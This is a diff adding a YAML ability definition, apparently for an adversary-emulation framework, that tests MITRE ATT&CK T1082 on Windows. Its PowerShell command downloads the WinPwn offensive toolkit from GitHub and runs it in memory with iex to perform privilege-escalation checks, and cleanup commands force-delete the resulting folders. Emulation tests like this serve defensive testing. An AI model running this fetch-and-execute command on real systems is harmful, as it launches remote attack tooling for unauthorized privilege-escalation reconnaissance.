@@ -1,0 +1,21 @@
+- description: Powersploits privesc checks using oldchecks function of WinPwn
+  id: 009e7a7118b5a182b2a5b65150e5cc6f
+  name: WinPwn - Powersploits privesc checks
+  platforms:
+    windows:
+      psh:
+        cleanup: rm -force -recurse .\DomainRecon -ErrorAction Ignore; rm -force -recurse
+          .\Exploitation -ErrorAction Ignore; rm -force -recurse .\LocalPrivEsc -ErrorAction
+          Ignore; rm -force -recurse .\LocalRecon -ErrorAction Ignore; rm -force -recurse
+          .\Vulnerabilities -ErrorAction Ignore
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          oldchecks -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
